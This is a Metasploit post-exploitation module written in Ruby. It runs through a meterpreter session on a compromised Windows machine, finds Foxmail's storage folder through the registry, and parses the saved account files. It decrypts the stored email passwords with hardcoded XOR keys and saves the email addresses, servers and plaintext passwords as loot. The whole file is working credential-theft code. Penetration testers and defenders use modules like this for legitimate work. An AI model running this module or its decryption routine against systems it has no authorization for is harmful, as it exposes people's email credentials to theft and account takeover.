##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather foxmail Passwords',
        'Description' => %q{
          This module can decrypt the password of foxmail,
          if the user chooses to remember the password.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-foxmail-encrypt-password/blob/master/doc/how-does-foxmail-encrypt-password.md']
        ],
        'Author' => [
          'Kali-Team <kali-team[at]qq.com>'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('Passphrase', [ false, 'If the user sets the master password, e.g.:123456']),
      ]
    )
  end

  def find_string(file, offset, length = 0)
    result_string = ''
    if length == 0
      while (file[offset] > "\x20" && file[offset] < "\x7f")
        result_string << file[offset]
        offset += 1
      end
      return result_string
    elsif offset && length != 0
      return file[offset, length].unpack1('S!*') # port
    else
      return nil
    end
  end

  def pass; end

  def enum_session_file(fpath)
    account_paths = []
    session.fs.dir.foreach(fpath) do |mail_addr|
      account_path = fpath + '\\' + mail_addr + '\\Accounts\\Account'
      account_paths.push(account_path + '.rec0') if session.fs.file.exist?(account_path + '.rec0')
      account_paths.push(account_path + '.stg') if session.fs.file.exist?(account_path + '.stg')
      account_paths.push(account_path + '.tdat') if session.fs.file.exist?(account_path + '.tdat')
    end
    tbl = []
    print_status("Search session files on #{fpath}")

    # enum session file
    account_paths.each do |file_name|
      file = read_file(file_name)
      if file.nil? || file.empty?
        next
      end

      print_good("Parsing configuration file: '#{file_name}', please wait.")
      offset = 0
      version = 0
      if file[0] == "\xD0"
        offset = 2
      else
        offset = 9
        version = 1
      end
      index = 0
      buffer = ''
      email_info = {}
      while index < file.length
        if (file[index] && file[index] > "\x20" && file[index] < "\x7f" && file[index] != "\x3d")
          buffer += file[index]
          if ['Email', 'IncomingServer', 'OutgoingServer', 'Password'].include?(buffer)
            email_info[buffer] = find_string(file, index + offset) || nil
          elsif ['IncomingPort', 'OutgoingPort'].include?(buffer)
            email_info[buffer] = find_string(file, index + 5, 2) || nil
          elsif ['InComingSSL', 'OutgoingSSL'].include?(buffer)
            email_info[buffer] = find_string(file, index + 5, 2) == 1 || false
          else
            pass
          end
        else
          buffer = ''
        end
        index += 1
      end
      email_info['Password'] = foxmail_crypto(version, email_info['Password']) if email_info['Password']
      tbl << {
        email: email_info['Email'],
        server: email_info['IncomingServer'],
        port: email_info['IncomingPort'],
        ssl: email_info['InComingSSL'],
        password: email_info['Password']
      }
      tbl << {
        email: email_info['Email'],
        server: email_info['OutgoingServer'],
        port: email_info['OutgoingPort'],
        ssl: email_info['OutgoingSSL'],
        password: email_info['Password']
      }
    end
    return tbl
  end

  def foxmail_crypto(version, ciphertext)
    miag_crypt = '~draGon~'
    v7_miag_crypt = '~F@7%m$~'
    # require 'pry';binding.pry
    fc0 = '5A'.to_i(16)
    if version == 1
      miag_crypt = v7_miag_crypt.unpack('c*')
      fc0 = '71'.to_i(16)
    end
    size = ciphertext.length / 2
    index = 0
    b = []
    (0..size).step(1) do |i|
      b[i] = ciphertext[index, 2].to_i(16)
      index += 2
    end
    b = b[0..-2]
    cc = []
    cc[0] = b[0] ^ fc0
    cc[1..-1] = b[1..-1]
    while miag_crypt.length < b.length
      new_miag_crypt = miag_crypt * 2
      miag_crypt = new_miag_crypt
    end
    d = []
    (1..b.length).each do |i|
      d[i - 1] = b[i] ^ miag_crypt[i - 1]
    end
    d[-1] = 0
    e = []
    (0..d.length - 1).each do |i|
      if (d[i] - cc[i] < 0)
        e[i] = d[i] + 255 - cc[i]
      else
        e[i] = d[i] - cc[i]
      end
    end
    e = e[0..-2]
    # require 'pry'; binding.pry
    return e.pack('C*')
  end

  def run
    print_status("Gather foxmail Passwords on #{sysinfo['Computer']}")
    # HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
    parent_key = 'HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview'
    # get session file path
    foxmail_path = expand_path(registry_getvaldata(parent_key, 'Executable'))
    foxmail_path = foxmail_path[0, foxmail_path.rindex('\\') + 1] + 'Storage'
    if foxmail_path
      result = enum_session_file(foxmail_path)
      columns = [
        'Email',
        'Server',
        'Port',
        'SSL',
        'Password'
      ]
      tbl = Rex::Text::Table.new(
        'Header' => 'Foxmail Password',
        'Columns' => columns
      )
      result.each do |item|
        tbl << item.values
      end
      print_line(tbl.to_s)
      if tbl.rows.count
        path = store_loot('host.foxmail_password', 'text/plain', session, tbl, 'foxmail_password.txt', 'foxmail Passwords')
        print_good("Passwords stored in: #{path}")
      end
    else
      print_error('Session path not found')
    end
  end
end
